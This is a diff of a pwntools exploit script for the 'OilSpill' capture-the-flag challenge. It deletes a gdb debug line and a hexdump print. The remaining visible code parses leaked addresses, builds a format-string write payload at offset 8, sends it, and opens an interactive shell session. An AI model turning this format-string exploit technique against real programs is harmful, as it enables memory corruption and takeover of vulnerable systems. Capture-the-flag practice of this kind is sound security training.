@@ -3,7 +3,6 @@ from pwn import *
 elf = context.binary = ELF('./OilSpill')
 
 io = process()
-# io = gdb.debug('./OilSpill', 'break *0x00400738\ncontinue')
 # io = remote('oil.sdc.tf', 1337)
 out = io.recvuntil(b'do you have any ideas of what we can use to clean it?\n')
 addrs = [int(a, 16) for a in out.split(b'\n')[0].split(b',')[:4]]
@@ -23,7 +22,6 @@ writes = {
 # 8 is the first offset - we can confirm this by running the program and sending %p 8 times
 # We then see that the last one contains the bytes for %p itself (0x2570)
 payload = fmtstr_payload(8, writes)
-print(hexdump(payload))
 io.sendline(payload)
 
 io.interactive()
